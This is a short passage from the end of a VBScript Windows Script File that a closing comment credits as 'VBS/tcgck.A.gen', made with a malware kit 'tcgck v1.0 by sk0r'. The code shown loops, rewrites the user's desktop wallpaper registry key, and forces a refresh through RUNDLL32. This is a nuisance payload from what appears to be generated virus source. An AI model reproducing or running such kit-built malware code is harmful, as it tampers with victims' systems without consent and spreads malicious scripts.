     skorWshs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", dateiinordner.Path 
     skorWshs.run ("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters") 
     WScript.Sleep 250 
   End If 
Next 
Loop 
 
' // End of VBS/tcgck.A.genmade with tcgck v1.0 by sk0r (Czybik) \\ '
</script> 
</job> 
</package> 
